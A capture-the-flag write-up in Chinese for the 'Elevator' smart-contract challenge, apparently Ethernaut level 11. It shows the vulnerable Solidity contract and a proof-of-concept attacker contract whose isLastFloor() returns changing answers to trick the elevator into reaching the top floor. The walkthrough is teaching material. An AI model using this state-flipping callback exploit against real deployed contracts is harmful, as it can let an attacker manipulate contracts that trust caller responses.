#   Level 11 Elevator
實例地址：`0x75Eb5D3536c19c97540D04fdeAAcf20aaB3dFe46`

##  題目說明
這台電梯會讓你到不了頂樓對吧？

  可能會有用的資訊

*   有的時候 Solidity 不是很遵守承諾
*   我們預期這個 Elevator(電梯) 合約會被用在一個 Building(大樓) 合約裡

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

##  POC
該合約的 `goto()` 裡面的 Building 合約是透過 `msg.sender` 進行設定，我們可以自訂我們的 Building 合約進行攻擊，控制 `isLastFloor()` 達到 top 為 True。

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Elevator {
    function goTo(uint256 _floor) external;
}

contract Building{
    Elevator public target;
    bool public top = false;
    
    constructor(address _target){
        target = Elevator(_target);
    }

    function attack() external{
        target.goTo(1);
    }

    function isLastFloor(uint256 _floor) external returns (bool){
        top = !top;
        return !top;
    }
}
```